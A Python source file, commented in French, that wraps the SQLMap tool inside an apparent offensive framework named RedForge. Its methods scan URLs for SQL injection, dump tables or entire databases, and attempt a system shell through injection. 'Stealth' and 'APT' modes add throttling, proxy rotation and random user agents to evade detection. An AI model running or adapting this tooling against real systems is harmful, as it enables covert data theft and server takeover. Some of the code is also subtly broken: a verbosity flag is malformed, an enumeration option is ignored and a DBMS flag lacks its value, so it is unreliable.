#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Wrapper SQLMap pour RedForge
Intégration de SQLMap pour la détection et l'exploitation des injections SQL
Version avec support furtif, APT et techniques avancées
"""

import subprocess
import re
import json
import tempfile
import time
import random
from typing import Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime

from src.core.stealth_engine import StealthEngine


class SQLMapWrapper:
    """Wrapper avancé pour SQLMap avec support furtif"""
    
    def __init__(self):
        self.sqlmap_path = self._find_sqlmap()
        self.available = self.sqlmap_path is not None
        self.stealth_mode = False
        self.apt_mode = False
        self.stealth_engine = StealthEngine()
        self.temp_files = []
    
    def _find_sqlmap(self) -> Optional[str]:
        """Trouve le chemin de SQLMap"""
        import shutil
        return shutil.which("sqlmap")
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les injections SQL avec SQLMap
        
        Args:
            target: URL cible
            **kwargs:
                - level: Niveau de risque (1-5)
                - risk: Risque (1-3)
                - techniques: Techniques à utiliser (B,E,U,S,T,Q)
                - data: Données POST
                - cookie: Cookie de session
                - threads: Nombre de threads
                - delay: Délai entre les requêtes
                - timeout: Timeout global
        """
        print(f"  → Scan SQL avec SQLMap")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan discret")
        
        if not self.available:
            return {
                "success": False,
                "error": "SQLMap non installé",
                "vulnerable": False,
                "databases": [],
                "apt_mode": self.apt_mode
            }
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        # Créer un fichier de sortie temporaire
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tmp:
            output_file = tmp.name
            self.temp_files.append(output_file)
        
        cmd = [self.sqlmap_path, "-u", target, "--batch"]
        
        # Mode APT: réduire l'agressivité
        if self.apt_mode:
            kwargs.setdefault('level', 1)
            kwargs.setdefault('risk', 1)
            kwargs.setdefault('techniques', 'T')  # Time-based seulement
            kwargs.setdefault('delay', 2)
            kwargs.setdefault('threads', 1)
            kwargs['random_agent'] = True
        
        # Niveau et risque
        level = kwargs.get('level', 3)
        cmd.extend(["--level", str(level)])
        
        risk = kwargs.get('risk', 2)
        cmd.extend(["--risk", str(risk)])
        
        # Techniques
        techniques = kwargs.get('techniques', 'BEUSTQ')
        if self.apt_mode:
            techniques = 'T'  # Time-based only
        cmd.extend(["--technique", techniques])
        
        # Données POST
        data = kwargs.get('data')
        if data:
            cmd.extend(["--data", data])
        
        # Cookie
        cookie = kwargs.get('cookie')
        if cookie:
            cmd.extend(["--cookie", cookie])
        
        # Threads
        threads = kwargs.get('threads', 5)
        if self.apt_mode:
            threads = 1
        cmd.extend(["--threads", str(threads)])
        
        # Délai entre les requêtes (mode furtif)
        delay = kwargs.get('delay')
        if delay:
            cmd.extend(["--delay", str(delay)])
        elif self.stealth_mode:
            min_delay, max_delay = self.stealth_engine.stealth_config.get('delay', (1, 3))
            avg_delay = (min_delay + max_delay) / 2
            cmd.extend(["--delay", str(round(avg_delay, 1))])
        
        # Timeout
        timeout = kwargs.get('timeout', 600)
        if self.apt_mode:
            timeout = 900
        cmd.extend(["--timeout", str(timeout)])
        
        # Output
        cmd.extend(["--output-dir", str(Path(output_file).parent)])
        
        # Options supplémentaires
        if kwargs.get('verbose'):
            cmd.append("-v")
        elif self.apt_mode:
            cmd.append("-v 0")  # Pas de verbosité
        
        if kwargs.get('random_agent') or self.stealth_mode:
            cmd.append("--random-agent")
        
        if kwargs.get('tamper'):
            cmd.extend(["--tamper", kwargs['tamper']])
        
        # Proxy (mode furtif)
        if self.stealth_mode and self.stealth_engine.proxy:
            proxy = self.stealth_engine.get_next_proxy()
            if proxy:
                cmd.extend(["--proxy", proxy])
        
        # Éviter les fausses détections
        if kwargs.get('smart'):
            cmd.append("--smart")
        
        if kwargs.get('flush_session'):
            cmd.append("--flush-session")
        
        if kwargs.get('fresh_queries'):
            cmd.append("--fresh-queries")
        
        # Exécution
        self._apply_stealth_delay()
        
        try:
            start_time = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            execution_time = time.time() - start_time
            output = result.stdout + result.stderr
            
            is_vulnerable = self._is_vulnerable(output)
            
            # Parser les résultats
            dbms_info = self._parse_dbms_info(output)
            databases = self._parse_databases(output) if is_vulnerable else []
            
            return {
                "success": True,
                "vulnerable": is_vulnerable,
                "dbms": dbms_info.get('dbms'),
                "dbms_version": dbms_info.get('version'),
                "databases": databases,
                "db_count": len(databases),
                "execution_time": execution_time,
                "command_used": ' '.join(cmd[:10]) + '...',
                "stealth_mode": self.stealth_mode,
                "apt_mode": self.apt_mode,
                "raw_output": output[:2000] if output else ""
            }
            
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": f"Scan timeout après {timeout}s",
                "vulnerable": False,
                "apt_mode": self.apt_mode
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "apt_mode": self.apt_mode
            }
        finally:
            # Nettoyer les fichiers temporaires
            self._cleanup_temp_files()
    
    def _is_vulnerable(self, output: str) -> bool:
        """Détermine si une vulnérabilité a été trouvée"""
        indicators = [
            "vulnerable",
            "parameter is vulnerable",
            "injection",
            "sqlmap identified the following injection point",
            "back-end DBMS",
            "target is vulnerable"
        ]
        return any(indicator in output.lower() for indicator in indicators)
    
    def _parse_dbms_info(self, output: str) -> Dict[str, Any]:
        """Parse les informations du SGBD"""
        result = {"dbms": None, "version": None}
        
        output_lower = output.lower()
        
        # Détection du type de SGBD
        if "mysql" in output_lower:
            result["dbms"] = "MySQL"
        elif "postgresql" in output_lower:
            result["dbms"] = "PostgreSQL"
        elif "microsoft sql" in output_lower or "mssql" in output_lower:
            result["dbms"] = "MSSQL"
        elif "oracle" in output_lower:
            result["dbms"] = "Oracle"
        elif "sqlite" in output_lower:
            result["dbms"] = "SQLite"
        
        # Extraction de la version
        version_pattern = r'version[\s:]+([\d\.]+)'
        match = re.search(version_pattern, output, re.IGNORECASE)
        if match:
            result["version"] = match.group(1)
        
        return result
    
    def _parse_databases(self, output: str) -> List[Dict[str, Any]]:
        """Parse les bases de données trouvées"""
        databases = []
        
        # Pattern pour les bases de données
        db_pattern = r'\[\*\] ([^\s]+)\s+\[(\d+)\]'
        
        for line in output.split('\n'):
            match = re.search(db_pattern, line)
            if match:
                databases.append({
                    "name": match.group(1),
                    "tables_count": int(match.group(2))
                })
        
        return databases
    
    def _cleanup_temp_files(self):
        """Nettoie les fichiers temporaires"""
        for file in self.temp_files:
            try:
                Path(file).unlink()
            except:
                pass
        self.temp_files = []
    
    def enumerate_databases(self, target: str, **kwargs) -> Dict[str, Any]:
        """Énumère toutes les bases de données"""
        kwargs['enumerate'] = True
        return self.scan(target, **kwargs)
    
    def dump_table(self, target: str, database: str, table: str, **kwargs) -> Dict[str, Any]:
        """
        Extrait le contenu d'une table
        
        Args:
            target: URL cible
            database: Nom de la base de données
            table: Nom de la table
            **kwargs: Options supplémentaires
        """
        if not self.available:
            return {"success": False, "error": "SQLMap non installé"}
        
        self._apply_stealth_delay()
        
        cmd = [
            self.sqlmap_path, "-u", target,
            "-D", database, "-T", table, "--dump",
            "--batch"
        ]
        
        # Mode furtif
        if self.stealth_mode:
            cmd.append("--random-agent")
            cmd.extend(["--delay", "2"])
        
        # Options
        if kwargs.get('columns'):
            cmd.extend(["-C", kwargs['columns']])
        
        if kwargs.get('where'):
            cmd.extend(["--where", kwargs['where']])
        
        if kwargs.get('start'):
            cmd.extend(["--start", str(kwargs['start'])])
        
        if kwargs.get('stop'):
            cmd.extend(["--stop", str(kwargs['stop'])])
        
        timeout = kwargs.get('timeout', 300)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            
            return {
                "success": result.returncode == 0,
                "database": database,
                "table": table,
                "output": result.stdout[:5000] if result.stdout else "",
                "apt_mode": self.apt_mode
            }
        except Exception as e:
            return {"success": False, "error": str(e), "apt_mode": self.apt_mode}
    
    def dump_database(self, target: str, database: str, **kwargs) -> Dict[str, Any]:
        """
        Extrait toutes les tables d'une base de données
        
        Args:
            target: URL cible
            database: Nom de la base de données
            **kwargs: Options supplémentaires
        """
        if not self.available:
            return {"success": False, "error": "SQLMap non installé"}
        
        self._apply_stealth_delay()
        
        cmd = [
            self.sqlmap_path, "-u", target,
            "-D", database, "--dump-all",
            "--batch"
        ]
        
        if self.stealth_mode:
            cmd.append("--random-agent")
            cmd.extend(["--delay", "2"])
        
        timeout = kwargs.get('timeout', 600)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            
            return {
                "success": result.returncode == 0,
                "database": database,
                "output": result.stdout[:5000] if result.stdout else "",
                "apt_mode": self.apt_mode
            }
        except Exception as e:
            return {"success": False, "error": str(e), "apt_mode": self.apt_mode}
    
    def get_os_shell(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Tente d'obtenir un shell système via SQLi
        
        Args:
            target: URL cible
            **kwargs: Options supplémentaires
        """
        if not self.available:
            return {"success": False, "error": "SQLMap non installé"}
        
        self._apply_stealth_delay()
        
        cmd = [self.sqlmap_path, "-u", target, "--os-shell", "--batch"]
        
        if self.stealth_mode:
            cmd.append("--random-agent")
        
        timeout = kwargs.get('timeout', 300)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            
            return {
                "success": "os-shell" in result.stdout.lower(),
                "output": result.stdout[:2000] if result.stdout else "",
                "apt_mode": self.apt_mode
            }
        except Exception as e:
            return {"success": False, "error": str(e), "apt_mode": self.apt_mode}
    
    def get_dbms_info(self, target: str) -> Dict[str, Any]:
        """
        Récupère les informations sur le SGBD
        
        Args:
            target: URL cible
        """
        if not self.available:
            return {"success": False, "error": "SQLMap non installé"}
        
        self._apply_stealth_delay()
        
        cmd = [self.sqlmap_path, "-u", target, "--dbms", "--batch"]
        
        if self.stealth_mode:
            cmd.append("--random-agent")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = result.stdout.lower()
            
            return self._parse_dbms_info(output)
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_version_info(self) -> Dict[str, Any]:
        """Retourne la version de SQLMap"""
        if not self.available:
            return {"available": False}
        
        try:
            result = subprocess.run([self.sqlmap_path, "--version"], 
                                   capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                version_line = result.stdout.split('\n')[0] if result.stdout else ""
                return {
                    "available": True,
                    "version": version_line,
                    "path": self.sqlmap_path
                }
        except:
            pass
        
        return {"available": False}


# Point d'entrée pour tests
if __name__ == "__main__":
    print("=" * 60)
    print("Test de SQLMapWrapper")
    print("=" * 60)
    
    wrapper = SQLMapWrapper()
    
    # Configuration mode APT
    wrapper.set_stealth_config({
        'enabled': True,
        'apt_mode': True,
        'delay_min': 2,
        'delay_max': 5
    })
    
    # Test (simulé)
    # results = wrapper.scan("https://example.com/page?id=1")
    # print(f"SQLi détectée: {results.get('vulnerable', False)}")
    
    print("\n✅ Module SQLMapWrapper chargé avec succès")